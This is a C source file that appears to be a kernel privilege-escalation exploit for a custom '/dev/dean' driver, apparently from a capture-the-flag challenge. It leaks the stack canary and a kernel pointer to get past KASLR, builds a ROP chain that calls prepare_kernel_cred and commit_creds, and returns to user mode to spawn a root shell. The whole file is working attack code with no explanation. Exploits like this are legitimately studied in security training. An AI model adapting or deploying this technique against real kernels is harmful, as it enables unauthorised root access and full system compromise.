#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

#define pop_rdi (kbase + 0x2e795) // pop rdi ; ret
#define xchg_rax_rdi (kbase + 0x98c795) // xchg rdi, rax ; dec dword ptr [rax - 0x77] ; ret
#define prepare_kernel_cred (kbase+0xd8800)
#define commit_creds (kbase+0xd8540)
#define swapgs (kbase+0xe010b0+54)

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void win() {
	system("/bin/sh");
}

unsigned long user_rip = (unsigned long)win;

int main() {
	save_state();

	setbuf(stdout, 0);
	char buf[0x100] = {0};
	unsigned long long* bptr;
	unsigned long long* krop;
	bptr = (unsigned long long*)(buf+2);
	int fd = open("/dev/dean", O_RDWR);
	if (fd == -1)
		perror("failed to open dean fd");


	read(fd, buf, 0x100);
	read(fd, buf, 0x100);
	for (int i = 0; i < 0x100/8; i+=1) {
		printf("%d\t%llx\n", i, bptr[i]);
	}

	unsigned long long canary = bptr[3];
	unsigned long long kstack = bptr[4];
	unsigned long long kleak = bptr[5];
	unsigned long long saved_rbx = bptr[7];
	unsigned long long kbase = (kleak & 0xFFFFFFFFFFF00000) - 0x300000;

	printf("canary @ %p\n", (void*)canary);
	printf("kernel leak @ %p\n", (void*)kleak);
	printf("kernel base @ %p\n", (void*)kbase);
	printf("swapgs @ %p\n", (void*)swapgs);
	printf("pop rdi @ %p\n", (void*)pop_rdi);

	char payload[0x1000] = "test";
	krop = (unsigned long long*)(&payload[32*8]);

	*krop++ = canary;
	*krop++ = 0; // saved rbx
	*krop++ = 0; // saved r12

	*krop++ = pop_rdi;
	*krop++ = 0;
	*krop++ = prepare_kernel_cred;
	*krop++ = pop_rdi;
	*krop++ = kstack;
	*krop++ = xchg_rax_rdi;
	*krop++ = commit_creds;
	*krop++ = swapgs;
	*krop++ = 0;
	*krop++ = 0;
	*krop++ = user_rip;
	*krop++ = user_cs;
	*krop++ = user_rflags;
	*krop++ = user_sp;
	*krop++ = user_ss;
	// *krop++ = kleak - 0xffffffffb753626f + 0xffffffffb75365c7; // orig_ret
	// *krop++ = 0x4141414141414141;
	
	unsigned long long size = (char*)krop - payload;
	*(unsigned long long*)(&payload[34*8]) = size; // saved r12

	printf("%x\n", size);
	write(fd, payload, size);
}

